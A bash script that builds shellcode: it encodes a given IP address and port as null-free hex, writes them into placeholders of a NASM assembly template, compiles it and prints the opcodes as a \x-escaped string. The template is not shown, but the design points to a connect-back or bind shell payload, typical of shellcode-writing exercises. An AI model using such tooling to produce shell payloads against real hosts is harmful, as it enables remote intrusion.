#! /bin/bash

#####################################
# Displays help
#####################################
function help(){
    echo "Usage: $0 <ip> <port_number> <file>"
    exit 1
}

#####################################
# Checking is root
#####################################

if [ $# -ne 3 ]; then
    help
fi

IP=$1
PORT=$2
FILE=$3

##############################
# Checking the port number
##############################

if [ ${PORT} -lt 1 ] || [ ${PORT} -gt 65535 ]; then
	echo "[*] Port number should be between 1 and 65535! Exiting..."
	exit
fi

# Converting port in hex and little endian representation
HEXFMTPORT=`printf "%04x" ${PORT}`
HEXFMTPORT1=$([ $((16#${HEXFMTPORT:0:2})) -ne 0 ] && echo 0x${HEXFMTPORT:0:2} || echo dl)
HEXFMTPORT2=$([ $((16#${HEXFMTPORT: -2})) -ne 0 ] && echo 0x${HEXFMTPORT: -2}	 || echo dl)

# final nasm filename
NASM_FILENAME=${FILE%.*}.nasm

########################
# Splitting IP address
########################
IP1=`echo ${IP} | cut -d. -f1`
IP2=`echo ${IP} | cut -d. -f2`
IP3=`echo ${IP} | cut -d. -f3`
IP4=`echo ${IP} | cut -d. -f4`

# Converting IP in hex and little endian representation
HEXFMTIP1=$([ ${IP1} -ne 0 ] && echo `printf "0x%x" ${IP1}` || echo dl)
HEXFMTIP2=$([ ${IP2} -ne 0 ] && echo `printf "0x%x" ${IP2}` || echo dl)
HEXFMTIP3=$([ ${IP3} -ne 0 ] && echo `printf "0x%x" ${IP3}` || echo dl)
HEXFMTIP4=$([ ${IP4} -ne 0 ] && echo `printf "0x%x" ${IP4}` || echo dl)

# for debugging purpose
echo "----------------------------"
echo "[*] HEXFMTPORT:${HEXFMTPORT}"
echo "[*] HEXFMTPORT1:${HEXFMTPORT1}"
echo "[*] HEXFMTPORT2:${HEXFMTPORT2}"
echo "[*] HEXFMTIP1:${HEXFMTIP1}"
echo "[*] HEXFMTIP2:${HEXFMTIP2}"
echo "[*] HEXFMTIP3:${HEXFMTIP3}"
echo "[*] HEXFMTIP4:${HEXFMTIP4}"
echo "----------------------------"
echo

# Replacing port and ip patterns
# Generating a new file source and compiling
sed "s/PORT1/${HEXFMTPORT1}/" ${FILE} > ${NASM_FILENAME} && \
sed -i "s/PORT2/${HEXFMTPORT2}/" ${NASM_FILENAME} && \
sed -i "s/IP1/${HEXFMTIP1}/" ${NASM_FILENAME} && \
sed -i "s/IP2/${HEXFMTIP2}/" ${NASM_FILENAME} && \
sed -i "s/IP3/${HEXFMTIP3}/" ${NASM_FILENAME} && \
sed -i "s/IP4/${HEXFMTIP4}/" ${NASM_FILENAME} && \
./compile.sh ${FILE%.*} && \
objdump -d ${FILE%.*}|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'